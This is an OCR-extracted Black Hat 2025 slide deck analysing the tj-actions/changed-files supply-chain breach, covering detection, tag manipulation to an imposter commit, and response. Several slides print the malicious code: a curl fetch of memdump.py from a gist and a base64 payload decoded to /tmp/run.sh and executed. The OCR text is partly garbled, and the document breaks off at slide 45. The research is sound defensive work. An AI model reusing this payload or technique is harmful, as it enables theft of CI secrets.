---
title: "When 'Changed Files' Changed Everything Uncovering and Responding to the tj-actions Supply Chain Breach"
speakers: ["Varun Sharma", "Ashish Kurmi"]
conference: "Black Hat"
conference_full: "Black Hat USA 2025"
edition: "USA"
year: 2025
source_pdf: "BlackHat_USA_2025_Slides/Varun Sharma&Ashish Kurmi_When 'Changed Files' Changed Everything Uncovering and Responding to the tj-actions Supply Chain Breach.pdf"
pages: 106
sha256: "0d57e8e0557a9cc19b0b8bdade9372d757106a41bfb0b7b32ae15939d7cbced4"
text_chars: 56138
ocr_pages: 78
has_ocr: true
redacted_secrets: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-11T23:03:54Z"
---
# When 'Changed Files' Changed Everything Uncovering and Responding to the tj-actions Supply Chain Breach

**Speakers:** Varun Sharma, Ashish Kurmi  
**Conference:** Black Hat USA 2025  
**Source:** `BlackHat_USA_2025_Slides/Varun Sharma&Ashish Kurmi_When 'Changed Files' Changed Everything Uncovering and Responding to the tj-actions Supply Chain Breach.pdf` (106 pages)


## Slide 1

**When ‘Changed Files’ Changed Everything** Uncovering and Responding to the tjactions Supply Chain Breach

Varun Sharma, Ashish Kurmi

## Slide 2

**When 'Changed Files' Changed Our Weekend Plans**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
When ‘Changed Files' Changed Our Weekend Plans
€ © — $% github.com/tj-actions/changed-files/is:
|= © tj-actions / changed-files Q Type [/) to search
<> Code © Issues (4) {2 Pullrequests (2) ) Discussions ©) Actions [6 Projects © Security (2) | Insights
Multiple tags in this action are compromised #2463
© Closed
varunsh-coder opened on Mar 14 - edited by varunsh-coder Edits ~
Example this tag was just updated 3 hours back and is potentially exfiltrating credentials
https://github.com/tj-actions/changed-files/tags?after=v35.9.3
You can read more here: https://www.stepsecurity.io/blog/harden-runner-detection-tj-actions-changed-files-action-is-compromised
Reported the issue via the email address provided in the security.md file and also reported it via private vulnerability disclosure to
generate a CVE.
77 )\ @ 32 )\ & 17
```

## Slide 3

**Spoiler: They were definitely changed**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Spoiler: They were definitely changed
GitHub Advisory Database / GitHub Reviewed / CVE-2025-30066
tj-actions changed-files through 45.0.7 allows remote attackers to discover secrets by reading actions logs.
(High severity) (GitHub Reviewed) Published on Mar 15 to the GitHub Advisory Database + Updated on Mar 24
Vulnerability details | Dependabot alerts (0)
Package Affected versions Patched versions
© tj-actions/changed-files (GitHub Actions) <= 45.0.7 46.0.1
Severity
Detection:
Credits
Analyze network traffic using Harden-Runner, which detects unauthorized outbound requests to: ©) varunsh-coder
(Analyst )
e@ = gist.githubusercontent.com
Live reproduction logs:
Harden-Runner Insights
This attack was detected by StepSecurity when anomaly detection flagged an unauthorized outbound network call to
gist.githubusercontent.com .
```

## Slide 4

**Spoiler: They were definitely changed**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Spoiler: They were definitely changed
Detection:
Analyze network traffic using Harden-Runner, which detects unauthorized outbound requests to:
e@ = gist.githubusercontent.com
Live reproduction logs:
Harden-Runner Insights
This attack was detected by StepSecurity when anomaly detection flagged an unauthorized outbound network call to
gist.githubusercontent.com .
```

## Slide 5

**Even CISA said ‘Yikes!’**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Even CISA said ‘Yikes!’
America’s Cyber Defense Agency Search
NATIONAL COORDINATOR FOR CRITICAL INFRASTRUCTURE SECURITY AND RESILIENCE
Topics ¥ Spotlight Resources & Tools ¥ News & Events ¥ Careers ¥ About v
Home / News&Events / Cybersecurity Advisories / Alert / Supply Chain Compromise of Third-Party tj-actions/changed-files (CVE-2025-
ALERT
Supply Chain Compromise of Third-Party tj-
actions/changed-files (CVE-2025-30066) and
reviewdog/action-setup@v1 (CVE-2025-30154)
Last Revised: March 26, 2025
A popular third-party GitHub Action, tj-actions/changed-files (tracked as CVE-2025-30066 &), was compromised. tj-
actions/changed-files is designed to detect which files have changed in a pull request or commit. The supply chain
compromise allows for information disclosure of secrets including, but not limited to, valid access keys, GitHub
```

## Slide 6

## Slide 7

### **Top Companies using changed-files**

**GitHub**

**Hugging Face**

**HashiCorp**

**Meta**

**Microsoft**

**Argo**

**TypeScript**

**Kong**

**PostHog**

## Slide 8

### **Agenda**

How was the attack detected?

What was the malicious code doing?

How was the action compromised?

How did organizations respond?

Lessons learned from the incident

## Slide 9

### **About Varun Sharma**

Co-Founder and CEO of StepSecurity, a cybersecurity startup securing CI/CD pipelines against supply chain attacks

Former Principal Security Software Engineering Manager at Microsoft

Led Azure’s Green Team to solve high-risk, systemic security issues.

MSc in Information Security from Royal Holloway, University of London

## Slide 10

### **About Ashish Kurmi**

CTO and Co-Founder of StepSecurity

Specializes in CI/CD and GitHub Actions security

Over 13 years of experience in security engineering at Plaid, Uber, and Microsoft

Recognized leader in developing advanced cybersecurity solutions

## Slide 11

**01. Introduction to GitHub Actions and the tj-actions/changed-files action**

## Slide 12

### **Brief Overview of GitHub Actions**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
m= deploy:
runs-on: ubuntu-latest
steps:
- uses: actions/checkout@v4
Brief Overview of -
GitH ub Actions uses tj-actions/changed-files@v44
files: |
infrastructure/+*
terraform/**
- if: steps.changed.outputs.any_changed == ‘true’
uses: aws—actions/configure—aws—credentials@v4
with:
aws-access—key-id: ${{ secrets.AWS_ACCESS KEY_ID }}
aws-secret-access-key: ${{ secrets.AWS_SECRET_ACCESS KEY }}
aws-region: us-west-2
- if: steps.changed.outputs.any_changed == ‘true’
uses: hashicorp/setup-terraform@v3
- if: steps.changed.outputs.any_changed == ‘true’
name: Deploy Infrastructure
working-directory: ./terraform
run: |
terraform init -backend-config="bucket=terraform-state-${{ vars.AWS_ACCOUNT_ID }}" \
-backend-config="key=infrastructure/terraform.tfstate" -backend-config="region=us-west-2"
terraform apply -auto-approve -input=false
- if: steps.changed.outputs.any_changed == ‘true’
name: Build & Push Image
run: |
aws ecr get-login-password | docker login —-username AWS \
—-password-stdin ${{ vars.AWS_ACCOUNT_ID }}.dkr.ecr.us-west-2.amazonaws.com
chmod +x ./scripts/build-and-push. sh
./scripts/build-and-push.sh ${{ github.sha }}
```

## Slide 13

### **Brief Overview of GitHub Actions**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
deploy:
=> runs-on: ubuntu-latest
steps:
- uses: actions/checkout@v4
Brief Overview of -
GitH ub Actions uses tj-actions/changed-files@v44
files: |
infrastructure/+*
terraform/**
- if: steps.changed.outputs.any_changed == ‘true’
uses: aws—actions/configure—aws—credentials@v4
with:
aws-access—key-id: ${{ secrets.AWS_ACCESS KEY_ID }}
aws-secret-access-key: ${{ secrets.AWS_SECRET_ACCESS KEY }}
aws-region: us-west-2
- if: steps.changed.outputs.any_changed == ‘true’
uses: hashicorp/setup-terraform@v3
- if: steps.changed.outputs.any_changed == ‘true’
name: Deploy Infrastructure
working-directory: ./terraform
run: |
terraform init -backend-config="bucket=terraform-state-${{ vars.AWS_ACCOUNT_ID }}" \
-backend-config="key=infrastructure/terraform.tfstate" -backend-config="region=us-west-2"
terraform apply -auto-approve -input=false
- if: steps.changed.outputs.any_changed == ‘true’
name: Build & Push Image
run: |
aws ecr get-login-password | docker login —-username AWS \
—-password-stdin ${{ vars.AWS_ACCOUNT_ID }}.dkr.ecr.us-west-2.amazonaws.com
chmod +x ./scripts/build-and-push. sh
./scripts/build-and-push.sh ${{ github.sha }}
```

## Slide 14

### **Brief Overview of GitHub Actions**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
deploy:
runs-on: ubuntu-latest
Brief Overview of eee
e ° : tj-actions/changed-files@v44
GitHub Actions “0
files: |
infrastructure/+*
terraform/**
- if: steps.changed.outputs.any_changed == ‘true’
uses: aws—actions/configure—aws—credentials@v4
with:
aws-access—key-id: ${{ secrets.AWS_ACCESS KEY_ID }}
aws-secret-access-key: ${{ secrets.AWS_SECRET_ACCESS KEY }}
aws-region: us-west-2
- if: steps.changed.outputs.any_changed == ‘true’
uses: hashicorp/setup-terraform@v3
- if: steps.changed.outputs.any_changed == ‘true’
name: Deploy Infrastructure
working-directory: ./terraform
run: |
terraform init -backend-config="bucket=terraform-state-${{ vars.AWS_ACCOUNT_ID }}" \
-backend-config="key=infrastructure/terraform.tfstate" -backend-config="region=us-west-2"
terraform apply -auto-approve -input=false
- if: steps.changed.outputs.any_changed == ‘true’
name: Build & Push Image
run: |
aws ecr get-login-password | docker login —-username AWS \
—-password-stdin ${{ vars.AWS_ACCOUNT_ID }}.dkr.ecr.us-west-2.amazonaws.com
chmod +x ./scripts/build-and-push. sh
./scripts/build-and-push.sh ${{ github.sha }}
```

## Slide 15

### **Brief Overview of GitHub Actions**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
deploy:
runs-on: ubuntu-latest
steps:
- uses: actions/checkout@v4
Brief Overview of -
GitH ub Actions => ves: tj-actions/changed-files@v44
files: |
infrastructure/+*
terraform/**
- if: steps.changed.outputs.any_changed == ‘true’
uses: aws—actions/configure—aws—credentials@v4
with:
aws-access—key-id: ${{ secrets.AWS_ACCESS KEY_ID }}
aws-secret-access-key: ${{ secrets.AWS_SECRET_ACCESS KEY }}
aws-region: us-west-2
- if: steps.changed.outputs.any_changed == ‘true’
uses: hashicorp/setup-terraform@v3
- if: steps.changed.outputs.any_changed == ‘true’
name: Deploy Infrastructure
working-directory: ./terraform
run: |
terraform init -backend-config="bucket=terraform-state-${{ vars.AWS_ACCOUNT_ID }}" \
-backend-config="key=infrastructure/terraform.tfstate" -backend-config="region=us-west-2"
terraform apply -auto-approve -input=false
- if: steps.changed.outputs.any_changed == ‘true’
name: Build & Push Image
run: |
aws ecr get-login-password | docker login —-username AWS \
—-password-stdin ${{ vars.AWS_ACCOUNT_ID }}.dkr.ecr.us-west-2.amazonaws.com
chmod +x ./scripts/build-and-push. sh
./scripts/build-and-push.sh ${{ github.sha }}
```

## Slide 16

### **Brief Overview of GitHub Actions**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
deploy:
runs-on: ubuntu-latest
steps:
- uses: actions/checkout@v4
Brief Overview of -
GitH ub Actions uses tj-actions/changed-files@v44
files: |
infrastructure/+*
terraform/**
- if: steps.changed.outputs.any_changed == ‘true’
= uses: aws—actions/configure—aws—credentials@v4
with:
aws-access-key-id: ${{ secrets.AWS_ACCESS KEY_ID }}
aws-secret-access-key: ${{ secrets. AWS_SECRET_ACCESS_KEY }}
aws-region: us-west-2
- if: steps.changed.outputs.any_changed == ‘true’
uses: hashicorp/setup-terraform@v3
- if: steps.changed.outputs.any_changed == ‘true’
name: Deploy Infrastructure
working-directory: ./terraform
run: |
terraform init -backend-config="bucket=terraform-state-${{ vars.AWS_ACCOUNT_ID }}" \
-backend-config="key=infrastructure/terraform.tfstate" -backend-config="region=us-west-2"
terraform apply -auto-approve -input=false
- if: steps.changed.outputs.any_changed == ‘true’
name: Build & Push Image
run: |
aws ecr get-login-password | docker login —-username AWS \
—-password-stdin ${{ vars.AWS_ACCOUNT_ID }}.dkr.ecr.us-west-2.amazonaws.com
chmod +x ./scripts/build-and-push. sh
./scripts/build-and-push.sh ${{ github.sha }}
```

## Slide 17

### **Brief Overview of GitHub Actions**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
deploy:
runs-on: ubuntu-latest
steps:
- uses: actions/checkout@v4
Brief Overview of -
GitH ub Actions uses tj-actions/changed-files@v44
files: |
infrastructure/+*
terraform/**
- if: steps.changed.outputs.any_changed == ‘true’
uses: aws—actions/configure—aws—credentials@v4
with:
aws-access—key-id: ${{ secrets.AWS_ACCESS KEY_ID }}
aws-secret-access-key: ${{ secrets.AWS_SECRET_ACCESS KEY }}
aws-region: us-west-2
- if: steps.changed.outputs.any_changed == ‘true’
—_= uses: hashicorp/setup-terraform@v3
- if: steps.changed.outputs.any_changed == ‘true’
name: Deploy Infrastructure
working-directory: ./terraform
run: |
terraform init -backend-config="bucket=terraform-state-${{ vars.AWS_ACCOUNT_ID }}" \
-backend-config="key=infrastructure/terraform.tfstate" -backend-config="region=us-west-2"
terraform apply -auto-approve -input=false
- if: steps.changed.outputs.any_changed == ‘true’
name: Build & Push Image
run: |
aws ecr get-login-password | docker login —-username AWS \
—-password-stdin ${{ vars.AWS_ACCOUNT_ID }}.dkr.ecr.us-west-2.amazonaws.com
chmod +x ./scripts/build-and-push. sh
./scripts/build-and-push.sh ${{ github.sha }}
```

## Slide 18

### **Brief Overview of GitHub Actions**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
deploy:
runs-on: ubuntu-latest
steps:
- uses: actions/checkout@v4
Brief Overview of -
GitH ub Actions uses tj-actions/changed-files@v44
files: |
infrastructure/+*
terraform/**
- if: steps.changed.outputs.any_changed == ‘true’
uses: aws—actions/configure—aws—credentials@v4
with:
aws-access—key-id: ${{ secrets.AWS_ACCESS KEY_ID }}
aws-secret-access-key: ${{ secrets.AWS_SECRET_ACCESS KEY }}
aws-region: us-west-2
- if: steps.changed.outputs.any_changed == ‘true’
uses: hashicorp/setup-terraform@v3
- if: steps.changed.outputs.any_changed == ‘true’
name: Deploy Infrastructure
working-directory: ./terraform
run: |
terraform init -backend-config="bucket=terraform-state-${{ vars.AWS_ACCOUNT_ID }}" \
-backend-config="key=infrastructure/terraform.tfstate" -backend-config="region=us-west-2"
terraform apply -auto-approve -input=false
- if: steps.changed.outputs.any_changed == ‘true’
name: Build & Push Image
run: |
aws ecr get-login-password | docker login —-username AWS \
—-password-stdin ${{ vars.AWS_ACCOUNT_ID }}.dkr.ecr.us-west-2.amazonaws.com
chmod +x ./scripts/build-and-push. sh
./scripts/build-and-push.sh ${{ github.sha }}
```

## Slide 19

### **Brief Overview of GitHub Actions**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
deploy:
runs-on: ubuntu-latest
steps:
- uses: actions/checkout@v4
Brief Overview of -
GitH ub Actions uses tj-actions/changed-files@v44
files: |
infrastructure/+*
terraform/**
- if: steps.changed.outputs.any_changed == ‘true’
uses: aws—actions/configure—aws—credentials@v4
with:
aws-access—key-id: ${{ secrets.AWS_ACCESS KEY_ID }}
aws-secret-access-key: ${{ secrets.AWS_SECRET_ACCESS KEY }}
aws-region: us-west-2
- if: steps.changed.outputs.any_changed == ‘true’
uses: hashicorp/setup-terraform@v3
- if: steps.changed.outputs.any_changed == ‘true’
name: Deploy Infrastructure
working-directory: ./terraform
run: |
terraform init -backend-config="bucket=terraform-state-${{ vars.AWS_ACCOUNT_ID }}" \
-backend-config="key=infrastructure/terraform.tfstate" -backend-config="region=us-west-2"
terraform apply -auto-approve -input=false
- if: steps.changed.outputs.any_changed == ‘true’
name: Build & Push Image
run: |
aws ecr get-login-password | docker login —-username AWS \
—-password-stdin ${{ vars.AWS_ACCOUNT_ID }}.dkr.ecr.us-west-2.amazonaws.com
chmod +x ./scripts/build-and-push. sh
./scripts/build-and-push.sh ${{ github.sha }}
```

## Slide 20

### **Brief Overview of GitHub Actions**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
deploy:
runs-on: ubuntu-latest
steps:
- uses: actions/checkout@v4
Brief Overview of _
GitH ub Actions _ tj-actions/changed-files@v44
files: |
infrastructure/+*
terraform/**
if: steps.changed.outputs.any_changed == ‘true‘
uses: aws—actions/configure—aws-credentials@v4
aws-region: us-west-2
if: steps. changed. outputs. any_changed
uses: hashicorp/setup-terraform@v3
if: steps.changed.outputs.any_changed ==
name: Deploy Infrastructure
working-directory: ./terraform
run: |
terraform init -backend-config="bucket=terraform-state-${{ vars.AWS_ACCOUNT_ID }}" \
-backend-config="key=infrastructure/terraform.tfstate" -backend-config="region=us-west-2"
terraform apply -auto-approve -input=false
if: steps.changed.outputs.any_changed == ‘true’
name: Build & Push Image
run: |
aws ecr get-login-password | docker login —-username AWS \
—-password-stdin ${{ vars.AWS_ACCOUNT_ID }}.dkr.ecr.us-west-2.amazonaws.com
chmod +x ./scripts/build-and-push. sh
./scripts/build-and-push.sh ${{ github.sha }}
```

## Slide 21

### **Brief Overview of GitHub Actions**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
deploy:
runs-on: ubuntu-latest
steps:
- uses: actions/checkout
Brief Overview of —
GitH ub Actions tj-actions/changed-files
files: |
infrastructure/+*
terraform/**
if: steps.changed.outputs.any_changed == ‘true‘
uses: aws—actions/configure—aws—credentials
with:
aws-access-key-id: ${{ secrets.AWS_ACCESS KEY_ID }}
aws-secret-access-key: ${{ secrets.AWS_SECRET_ACCESS KEY }}
aws-region: us-west-2
if: steps.changed.outputs.any_changed ==
uses: hashicorp/setup-terraform
if: steps.changed. outputs. any_changed
name: Deploy Infrastructure
working-directory: ./terraform
run: |
terraform init -backend-config="bucket=terraform-state-${{ vars.AWS ACCOUNT_ID }}" \
-backend-config="key=infrastructure/terraform.tfstate" -backend-config="region=us-west-2"
terraform apply -auto-approve -input=false
if: steps.changed.outputs.any_changed == ‘true’
name: Build & Push Image
run: |
aws ecr get-login-password | docker login —-username AWS \
—-password-stdin ${{ vars.AWS_ACCOUNT_ID }}.dkr.ecr.us-west-2.amazonaws.com
chmod +x ./scripts/build-and-push.sh
./scripts/build-and-push.sh ${{ github.sha }}
```

## Slide 22

### **Brief Overview of GitHub Actions**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Brief Overview of =
G it H u b Acti re) n S uses: tj-actions/changed-files@v44
files: |
infrastructure/+**
terraform/**
```

## Slide 23

### **Brief Overview of GitHub Actions**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Brief Overview of
G it H u b Acti re) n S uses: tj-actions/changed-files@v44
files: |
infrastructure/+**
terraform/**
: steps.changed.outputs.any_changed == ‘true’
: steps.changed.outputs.any_changed ==
: steps. changed. outputs. any_changed
- if: steps.changed.outputs.any_changed == ‘true’
```

## Slide 24

**Demo: GitHub Actions Workflow Run**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Demo: GitHub Actions Workflow Run
name: Deploy Infrastructure and Application
on:
push:
branches: [main]
```

## Slide 25

**Demo: GitHub Actions Workflow Run**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Demo: GitHub Actions Workflow Run
on:
push:
branches: [main]
```

## Slide 26

### **Demo: GitHub Actions Workflow Run**

Pull Request Merge to main Workflow Triggers

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Demo: GitHub Actions Workflow Run
name: Deploy Infrastructure and Application
on:
push:
branches: [main]
Pull Request » Merge to main » Workflow Triggers
```

## Slide 27

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
©) github-actions-demo/.gith +
*3 github.com/step-security/github-actions-demo/blob/main/.github/workflows/deploy.ym
=o
we) step-security github-actions-demo & Q Type[/)to search 6 -
> Code ©) Issues [} Pullrequests 1 © Actions fF Projects Wik Security [¥ Insights £3 Settings
CD P main ~ github-actions-demo / .github / workflows / deploy.yml (OQ View Runs
@ ashishkurmi Update deploy.ym| © History
Code Blame 42 lines (37 loc)
name: Deploy Infrastructure and Application
on:
push:
branches: [main]
obs:
deploy:
runs-on: ubuntu-latest
eps:
—- uses: actions/checkout@v4
id: changed
tj-actions/changed-files@v44
infrastructure/**
terraform/**
if: steps.changed.outputs.any_ changed == ‘true’
aws-actions/configure—aws—credentials@v4
```

## Slide 28

**02. Initial Detection and Investigation**

## Slide 29

**Baseline-driven security monitoring**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Baseline-driven security monitoring
Baseline stability status © Baseline based on jaseline changed Last changed ©
2247 job runs 2220 runs ago 8 months ago
View changelog > View workflow runs > View changelog > View changelog >
Observed destinations Status Firstseen ¢ Last called on ¢ Total calls ¢ Sample Workflow Runs
github.com © Allowed 8 months ago 9 minutes ago 2247 View workflow runs
sts.us-west-2.amazonaws.com
©
Allowed 8 months ago 9 minutes ago View workflow runs
releases.hashicorp.com Allowed 8 months ago 9 minutes ago View workflow runs
checkpoint-api.hashicorp.com Allowed 8 months ago 9 minutes ago View workflow runs
terraform-state-381492090279.s3.us-west-2.amazonaws.com Allowed 8 months ago 9 minutes ago View workflow runs
registry.terraform.io Allowed 8 months ago 9 minutes ago View workflow runs
api.ecr.us-west-2.amazonaws.com Allowed 8 months ago 9 minutes ago View workflow runs
381492090279.dkr.ecr.us-west-2.amazonaws.com Allowed 8 months ago 9 minutes ago View workflow runs
auth.docker.io Allowed 8 months ago 9 minutes ago View workflow runs
registry-1.docker.io
Allowed 8 months ago 9 minutes ago View workflow runs
production.cloudflare.docker.com Allowed 8 months ago 9 minutes ago View workflow runs
© © G8 © 8 G8 8 O8 GO O
di-cdn.alpinelinux.org Allowed 8 months ago 8 minutes ago View workflow runs
```

## Slide 30

**Baseline-driven security monitoring**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Baseline-driven security monitoring
Baseline stability status @ aseline based on Baseline cha Last cha
Stabl 2247 job runs 2220 runs ago 8 months ago
View changelog > View workflow runs > View changelog > View changelog >
Observed destinations Status Firstseen ¢ Last called on ¢ Total calls ¢ Sample Workflow Runs
github.com © Allowed 8 months ago 9 minutes ago 2247 View workflow runs
sts.us-west-2.amazonaws.com
©
Allowed 8 months ago 9 minutes ago View workflow runs
releases.hashicorp.com Allowed 8 months ago 9 minutes ago View workflow runs
checkpoint-api.hashicorp.com Allowed 8 months ago 9 minutes ago View workflow runs
terraform-state-381492090279.s3.us-west-2.amazonaws.com Allowed 8 months ago 9 minutes ago View workflow runs
registry.terraform.io Allowed 8 months ago 9 minutes ago View workflow runs
api.ecr.us-west-2.amazonaws.com Allowed 8 months ago 9 minutes ago View workflow runs
381492090279.dkr.ecr.us-west-2.amazonaws.com Allowed 8 months ago 9 minutes ago View workflow runs
auth.docker.io Allowed 8 months ago 9 minutes ago View workflow runs
registry-1.docker.io
Allowed 8 months ago 9 minutes ago View workflow runs
production.cloudflare.docker.com Allowed 8 months ago 9 minutes ago View workflow runs
© © G8 © 8 G8 8 O8 GO O
di-cdn.alpinelinux.org Allowed 8 months ago 8 minutes ago View workflow runs
```

## Slide 31

**Baseline-driven security monitoring**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Baseline-driven security monitoring
Baseline stability status © Baseline based on jaseline changed Last changed ©
2247 job runs 2220 runs ago 8 months ago
View changelog > View workflow runs > View changelog > View changelog >
Observed destinations Status Firstseen ¢ Last called on ¢ Total calls ¢ Sample Workflow Runs
® github.com © Allowed 8 months ago 9 minutes ago 2247 View workflow runs
sts.us-west-2.amazonaws.com © Allowed 8 months ago 9 minutes ago View workflow runs
releases.hashicorp.com (3) Allowed 8 months ago 9 minutes ago View workflow runs
checkpoint-api.hashicorp.com Allowed 8 months ago 9 minutes ago View workflow runs
terraform-state-381492090279.s3.us-west-2.amazonaws.com Allowed 8 months ago 9 minutes ago View workflow runs
registry.terraform.io Allowed 8 months ago 9 minutes ago View workflow runs
api.ecr.us-west-2.amazonaws.com Allowed 8 months ago 9 minutes ago View workflow runs
381492090279.dkr.ecr.us-west-2.amazonaws.com Allowed 8 months ago 9 minutes ago View workflow runs
auth.docker.io Allowed 8 months ago 9 minutes ago View workflow runs
registry-1.docker.io
Allowed 8 months ago 9 minutes ago View workflow runs
production.cloudflare.docker.com Allowed 8 months ago 9 minutes ago View workflow runs
© © G8 8 8 © O8 O O
di-cdn.alpinelinux.org Allowed 8 months ago 8 minutes ago View workflow runs
```

## Slide 32

**Baseline-driven security monitoring**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Baseline-driven security monitoring
Baseline stability status (
Baseline based on
2247 job runs
View changelog > View workflow runs >
Observed destinations
® github.com
Status
© Allowed
Baseline changed
2220 runs ago
View changelog >
Firstseen <
8 months ago
Last calledon ¢
9 minutes ago
Last changed @
8 months ago
View changelog >
Total calls ¢
2247
Sample Workflow Runs
View workflow runs
sts.us-west-2.amazonaws.com
releases.hashicorp.com
checkpoint-api.hashicorp.com
terraform-state-381492090279.s3.us-west-2.amazonaws.com
registry.terraform.io
api.ecr.us-west-2.amazonaws.com
381492090279.dkr.ecr.us-west-2.amazonaws.com
auth.docker.io
registry-1.docker.io
production.cloudflare.docker.com
©
©
©
©
©
©
©
©
©
9)
Allowed
Allowed
Allowed
Allowed
Allowed
Allowed
Allowed
Allowed
Allowed
Allowed
8 months ago
8 months ago
8 months ago
8 months ago
8 months ago
8 months ago
8 months ago
8 months ago
8 months ago
8 months ado
9 minutes ago
9 minutes ago
9 minutes ago
9 minutes ago
9 minutes ago
9 minutes ago
9 minutes ago
9 minutes ago
9 minutes ago
9 minutes ago
View workflow runs
View workflow runs
View workflow runs
View workflow runs
View workflow runs
View workflow runs
View workflow runs
View workflow runs
View workflow runs
View workflow runs
```

## Slide 33

**Anomalous detection event on March 14**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Anomalous detection event on March 14
github-actions-goat tj-action changed-files incident
ummary 4 NetworkEvents  [3) File Write Events
Test changed-files
© Test changed-files
Harden-runner policy: Audit Start time Mar 14 2025 15:06:56
Runner name - Duration lls
Job labels - Baseline status: Unstable
& Events 2 Baseline
Show findings only
Step Process Destination Status Timestamp 2
Run act /checkout@v4 ithub.com
@ Run actions/checkout@v git-remote-http © 9 © Allowed Mar 14 2025 15:07:03
actions/checkout@v4 > API Calls 1
Get cha d fil
@ Get changedfiles O sist.git sercontent Mar 14 2025 15:07:04
tj-actions/changed-files@v35
```

## Slide 34

### **Anomalous detection event on March 14**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Anomalous detection event on March 14
Get ch d fil
@ Get changed files 2258 curl Q) gist.githubusercontent.com 443 Anomalous Mar 14 2025 15:07:04
tj-actions/changed-files@v35
```

## Slide 35

**Initial Investigation Steps**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Initial Investigation Steps
Process Events
/bin/curl (PID
/usr/bin/curl (PID: 2258)
Working Directory: /home/runner/work/github-actions-goat/github-actions-goat
curl -sSf Tm)
https://gist.githubusercontent. com/nikitastupin/30e525b776c409e03c2d6f328f254965/ raw/memdump. py
```

## Slide 36

# **Discovery of Tag Manipulation**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Discovery of Tag Py
Manipulation me)
TRUSTED
we
```

## Slide 37

### **Discovery of Tag Manipulation**

All tags were redirected to
the malicious commit

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Discovery of Tag Manipulation
$ git tag -1 | while read -r tag ; do git show -
v1.0.0: @e58ed8671d6b60d0890c21b07f8835ace038e67
vii @e58ed8671d6b60d0890c21b07F8835ace038e67
v1.0.1: @e58ed8671d6b60d0890c21b07f8835ace038e67
v1@.1: @e58ed8671d6b60d0890c21b07f8835ace038e67
v1.0. @e58ed8671d6b60d0890c21b07f8835ace038e67
v1.0.3: @e58ed8671d6b60d0890c21b07f8835ace038e67
v1: @e58ed8671d6b60d0890c21b07 f8835ace038e67
v1.1.0: @e58ed8671d6b60d0890c21b07f8835ace038e67
v1 @e58ed8671d6b60d0890c21b07F8835ace038e67
v1.1. @e58ed8671d6b60d0890c21b07f8835ace038e67
v11.1: @e58ed8671d6b60d0890c21b07f8835ace038e67
v1.1.2: @e58ed8671d6b60d0890c21b07f8835ace038e67
v11.2: @e58ed8671d6b60d0890c21b07f8835ace038e67
@e58ed8671d6b60d0890c21b07f8835ace038e67
v11.3: @e58ed8671d6b60d0890c21b07f8835ace038e67
v11.4: @e58ed8671d6b60d0890c21b07f8835ace038e67
V11.5:_@e58ed8671d6b60d0890c21b07F8835ace038e67
All tags were redirected to
<— the malicious commit
```

## Slide 38

### **Discovery of Tag Manipulation**

0e58ed86

## Slide 39

**03. Anatomy of the AttackTechnical Analysis**

## Slide 40

**The Malicious Imposter Commit**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
The Malicious Imposter Commit
/ This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.
```

## Slide 41

# **Imposter Commit**

## Slide 42

### **Steps to update a release tag to an Imposter Commit**

Update Tag
Original Action  Attacker  Add
v35 -> Malicious
Repository Creates a Fork Malicious Commit Commit
Legitimate repo Fork of the  Inject Backdoor Update tag to
with release tag v35 original repo into fork malicious commit

Result: All GitHub Actions workflows using action@v35 now execute malicious code

## Slide 43

**Details of the malicious Imposter Commit​**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Details of the malicious Imposter Commit
"“aWYoW1sgI1RPU1ZUEU LIDQ@9ICJsaw5 leC LnbnU LIF Ld0yB@aGVuC1AgQj YOXOIMTOI9YGN
Lcmw9LXNTZiBodHRweSBBIHN1ZG8gc LOadG9uUMy8B8IHRyIC1kICdcMCCg fCBncWwIC1hbeuU
gJyJbX1JdKyI6XHs idnFsdMU101JbX1JdKApmaQo="
```

## Slide 44

**Details of the malicious Imposter Commit​**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Details of the malicious Imposter Commit
+ async function updateFeatures(token) {
const { stdout, stderr } = await exec.getExecOutput('bash', ['-c', ~echo
“aWYoW1sgI1RPU1ZUEU LID@9ICJsaw5 leC LnbnU LIF L\d0yB@aGVuC1AgQj YOXOIMTOI9YGN
Lcmw9LXNTZiBodHRweSBBIHN1lZG8gc LO@adG9uMy8B8IHRyIC1kICdcMCCgfCBncWwIC1hbeU
gJyJbX1JdKyI6XHsidnFsdMU101JbX1JdKApmaQo=" | base64 -d > /tmp/run.sh|&& bash /tmp/run.sh’], {
ignoreReturnCode: true,
silent: true
});
core. info(stdout);
```

## Slide 45

**Details of the malicious Imposter Commit​**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Details of the malicious Imposter Commit
